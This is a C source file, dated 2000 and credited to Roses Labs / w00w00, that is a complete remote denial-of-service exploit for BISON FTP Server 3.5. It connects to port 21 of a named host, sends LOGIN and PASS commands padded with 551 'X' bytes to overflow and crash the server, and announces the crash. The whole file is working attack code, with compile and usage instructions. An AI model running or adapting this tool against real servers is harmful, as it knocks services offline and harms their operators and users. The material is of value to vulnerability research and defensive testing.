/*
 * FILE: rlxbison.c
 * CODER: Conde Vampiro.
 * DATE: 2/29/2000.
 * ABSTRACT: Remote DoS of BISON FTP Server 3.5
 *
 * Compile: gcc rlxbison.c -o rlbison
 *
 * Roses Labs / w00w00
 * http://www.roses-labs.com
 * Advanced Security Research.
*/

#include <stdio.h>
#include <sys/socket.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <unistd.h>

/* Defines */

#define MAX 551
#define MAXDATA 1024

/* Global variables */

int sock;
int i;
char datacrap[MAX];
char *temp;
char tempdata[MAXDATA];
char buf[MAXDATA];
struct hostent *host;
struct sockaddr_in KillFTP;

/* Prototypes */
 
unsigned long resolve(char *host_name);
char *crap(int num);

/* Main */

int main(int argc, char *argv[]) {

        if(argc < 2) {
                printf("Usage: %s <Host>\n", argv[0]);
                exit(-1);
        }
        KillFTP.sin_family=AF_INET;
        KillFTP.sin_addr.s_addr=resolve(argv[1]);
        if(!KillFTP.sin_addr.s_addr) {
                printf("Host Unkown: %s\n",argv[1]);
                exit(-1);
        }
        KillFTP.sin_port=htons(21);
        sock=socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0) {
                printf("Error creating socket!!\n");
                exit(-1);
        }
        if(!connect(sock,(struct sockaddr *)&KillFTP, sizeof(KillFTP))) {
                printf("Roses Labs Bison FTP Xploit\n");
                printf("Remote crashing code!!!\n");
                recv(sock,tempdata,sizeof(tempdata),0);
                sleep(1);
                recv(sock,tempdata,sizeof(tempdata),0);
                temp=crap(MAX);
                sprintf(buf,"LOGIN %s\n",temp);
                send(sock,buf,strlen(buf),0);
                sprintf(buf,"PASS %s\n",temp);
                send(sock,buf,strlen(buf),0);
                printf("Host %s crashed!!\n",argv[1]);
                exit(0);
        } else {
                printf("Couldn't connect to %s on port 21,\n", argv[1]);
                exit(-1);
        }
        if(close(sock)) {
                printf("Error closing socket!!\n");
                exit(-1);
        }
return(0);
}

/* Functions */

unsigned long resolve(char *host_name) {
        struct in_addr addr;
        struct hostent *host_nam;

        if((addr.s_addr = inet_addr(host_name)) == -1) {
        if(!(host_nam = gethostbyname(host_name))) return(0);
        memcpy((char *) &addr.s_addr, host_nam->h_addr, host_nam->h_length);
        }
        return(addr.s_addr);
}

char *crap(int num) {
        for(i=0;i<num;i++) {
                datacrap[i]='X';
        }
        return(datacrap);
}

/* w00w00 E0F */


